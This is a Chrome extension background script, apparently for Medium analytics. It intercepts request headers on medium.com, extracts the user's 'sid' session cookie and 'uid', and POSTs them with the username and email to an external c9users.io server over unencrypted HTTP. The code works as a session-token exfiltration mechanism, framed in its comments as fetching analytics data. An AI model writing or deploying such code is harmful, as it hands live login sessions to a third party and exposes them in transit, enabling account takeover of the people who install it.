const $ = require('jquery');
// this code can run in the background, but is currently set to work with events.
// Google: chrome.runtime.onMessage.addListener
// this code runs on every page opened
const PROTOCOL = "http"//"https";
const SERVER_BASE = "newspace-calderwhite.c9users.io";
const API_PATH = "/api"
var userInfo = {
    username : null,
    userId : null,
    sessionId: null,
    email: null
}
function sendData(callback){
    $.ajax({
        type:"POST",
        url:PROTOCOL + "://" + SERVER_BASE + API_PATH + "/new_credentials",
        data:userInfo,
    })
    if(callback != undefined && callback != null){
    	callback();
    }
}

function checkSendHeaders(details){
    let url = details.url;
    if(url.toLowerCase().search("_/api/stream") > -1){
        // this will contain the special cookies we need to get the analytics data
        let cookies = {};
        for(let i=0;i<details.requestHeaders.length;i++){
            if(details.requestHeaders[i].name.toLowerCase().search("cookie") > -1){
                let cookieTemp = details.requestHeaders[i].value.split(";");
                for(let j=0;j<cookieTemp.length;j++){
                    let [name,value] = cookieTemp[j].split("=");
                    // get rid of any trailing spaces
                    name = name.replace(/ /g,"");
                    cookies[name] = value;
                }
            }
        }
        // this is really the tricky token we need
        let sessionId = cookies["sid"];
        // user id is all over the place, but we'll pick it up here just to be concise
        let userId = cookies["uid"];
        // set values globally
        userInfo.userId = userId;
        userInfo.sessionId = sessionId;
        // if all the values are present, make the POST request
        if(userInfo.username != null){
            sendData();
        }
    }
}


chrome.webRequest.onSendHeaders.addListener(
    checkSendHeaders,
    {
        urls:['*://*.medium.com/*']
    },
    [
        'requestHeaders'
    ]
)
chrome.runtime.onMessage.addListener(function(request, sender, callback) {
    if(request.username != undefined){
        userInfo.username = request.username;
        userInfo.email = request.email;
        if(userInfo.userId != null && userInfo.sessionId != null){
            sendData(callback)
        }
    }
	return true;
});
chrome.runtime.onMessage.addListener((request, sender, callback) =>{
    if(request.message == 'open-analytics'){
        window.openAnalytics();
        if(request.closeCurrent){
            chrome.tabs.remove(sender.tab.id);
        }
        console.log('ay')
    }
})

// functions accessable by other windows
window.openMediumForward = () => {
    window.open("https://medium.com?forward-to-medium-analytics")
}
window.openAnalytics = () => {
    console.log("Opening analytics...")
    chrome.tabs.create({url:chrome.extension.getURL('app/index.html')})
}
window.openPage = (url) =>{
    window.open(url);
}
window.getCurrentUserData = () =>{
    return userInfo
}
